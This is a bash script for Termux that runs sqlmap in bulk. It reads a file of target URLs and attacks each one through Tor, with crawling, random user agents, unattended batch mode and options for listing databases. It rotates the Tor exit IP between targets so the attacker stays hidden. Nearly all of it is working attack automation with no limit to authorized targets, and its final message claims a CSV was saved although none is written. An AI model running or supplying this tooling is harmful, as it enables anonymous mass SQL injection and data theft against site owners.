#!/data/data/com.termux/files/usr/bin/bash

# Colors
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
RESET="\033[0m"

echo -e "${GREEN}🛡️  Advanced SQLMap + Tor Auto Scanner v3${RESET}"

# Start Tor if not already
if ! pgrep -x tor > /dev/null; then
    echo -e "${YELLOW}[+] Starting Tor service...${RESET}"
    tor & sleep 5
else
    echo -e "${GREEN}[✓] Tor already running${RESET}"
fi

# Input: URL list file
read -p "📁 URL list file (one per line): " url_file
[[ ! -f "$url_file" ]] && echo -e "${RED}[!] File not found$RESET" && exit 1

# Extra SQLMap options
read -p "⚙️  Extra SQLMap options (e.g. --dbs --current-user): " extra_options

# Create output dirs
mkdir -p logs
output_csv="$HOME/.local/share/sqlmap/output/auto-results-$(date +%d%m%Y_%I%M%p).csv"

# Show Tor IP before
echo -ne "➡️  Tor IP before: "
torsocks curl -s https://ifconfig.me | tee /tmp/tor_before_ip.txt

# Loop
count=0
total=$(grep -cve '^\s*$' "$url_file")

while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    count=$((count + 1))
    echo -e "\n${YELLOW}[${count}/${total}] Target: ${url}${RESET}"

    # Clean domain for log name
    log_name=$(echo "$url" | sed 's|https\?://||; s|[/?=&]|_|g')
    log_file="logs/${log_name}.log"

    echo -e "${BLUE}🚀 Running SQLMap...${RESET}"
    start_time=$(date +%s)

    torsocks python3 sqlmap/sqlmap.py -u "$url" \
        --crawl=2 \
        --random-agent \
        --timeout=30 \
        --delay=3 \
        --retries=2 \
        --batch \
        --output-dir="$HOME/.local/share/sqlmap/output" \
        $extra_options | tee "$log_file"

    end_time=$(date +%s)
    duration=$((end_time - start_time))

    # Check status
    echo -ne "${YELLOW}📋 Status: ${RESET}"
    if grep -q "\[INFO\] testing" "$log_file"; then
        echo -e "${GREEN}✓ SQLMap executed${RESET}"
    else
        echo -e "${RED}✗ Possibly failed or skipped${RESET}"
    fi

    # Save log path
    echo -e "📝 Log saved: ${log_file}"

    # Show Tor IP
    echo -ne "⬅️  Tor IP after: "
    torsocks curl -s https://ifconfig.me

    # Rotate Tor IP (optional)
    echo -e "${BLUE}🔁 Rotating Tor IP...${RESET}"
    pkill -HUP tor
    sleep 5

    # Adaptive delay (updated)
    if [ "$duration" -lt 20 ]; then
        delay=10
    else
        delay=15
    fi

    echo -e "${YELLOW}⏱️  Waiting ${delay}s before next...${RESET}"
    sleep $delay
    echo "-----------------------------------------------"

done < "$url_file"

echo -e "${GREEN}✅ All targets scanned. Logs & CSV saved.${RESET}"
